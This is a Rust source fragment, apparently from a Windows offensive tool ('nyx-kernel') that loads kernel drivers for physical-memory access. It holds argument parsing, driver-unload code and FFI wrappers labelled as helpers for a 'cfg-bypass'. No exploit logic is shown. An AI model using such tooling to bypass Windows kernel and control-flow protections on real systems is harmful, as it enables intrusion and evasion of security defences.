/// loaded-driver residue (same contract as `wdt::bootstrap_phys_with`).
#[cfg(target_os = "windows")]
fn unload_phys_bootstrap(b: nyx_operator_kernelsdk::win::KernelBootstrap) {
    use nyx_operator_kernelsdk::win::KernelBootstrap;
    match b {
        KernelBootstrap::Wdt(mut loaded, _) | KernelBootstrap::Alsys(mut loaded, _) => {
            loaded.unload();
        }
        // Phys arms only produce Wdt/Alsys; other variants carry nothing to do.
        _ => {}
    }
}

#[cfg(target_os = "windows")]
fn parse_pid(args: &[String], pos: usize) -> u32 {
    args.get(pos).and_then(|s| s.parse().ok()).unwrap_or(0)
}

#[cfg(target_os = "windows")]
fn parse_window_phase(args: &[String]) -> &str {
    let cmd = args.get(1).map(|s| s.as_str()).unwrap_or("");
    match cmd {
        "window-open" => "open",
        "window-close" => "close",
        "window" => {
            if let Some(i) = args.iter().position(|a| a == "--phase") {
                args.get(i + 1).map(|s| s.as_str()).unwrap_or("")
            } else {
                args.get(2).map(|s| s.as_str()).unwrap_or("")
            }
        }
        _ => "",
    }
}

#[cfg(target_os = "windows")]
fn parse_window_pid(args: &[String]) -> Option<u32> {
    args.iter()
        .rev()
        .find_map(|s| s.parse::<u32>().ok())
        .filter(|p| *p > 0)
}

// ---- Windows FFI helpers for cfg-bypass ----
#[cfg(target_os = "windows")]
extern "system" {
    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut core::ffi::c_void;
    fn GetProcAddress(
        hModule: *mut core::ffi::c_void,
        lpProcName: *const u8,
    ) -> *mut core::ffi::c_void;
}

#[cfg(target_os = "windows")]
unsafe fn winapi_get_module_handle(name: &str) -> *mut core::ffi::c_void {
    unsafe { GetModuleHandleA(name.as_ptr()) }
}

#[cfg(target_os = "windows")]
unsafe fn winapi_get_proc_address(
    h: *mut core::ffi::c_void,
    name: *const u8,
) -> *mut core::ffi::c_void {
    unsafe { GetProcAddress(h, name) }
}
// ---- Non-Windows stub (so `cargo check` on macOS doesn't hard-error) ----
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "nyx-kernel: Windows-only tool. This binary must be built and run on a Windows target."
    );
    eprintln!("Build with: cargo +nightly build --release --target x86_64-pc-windows-msvc");
    std::process::exit(1);
}
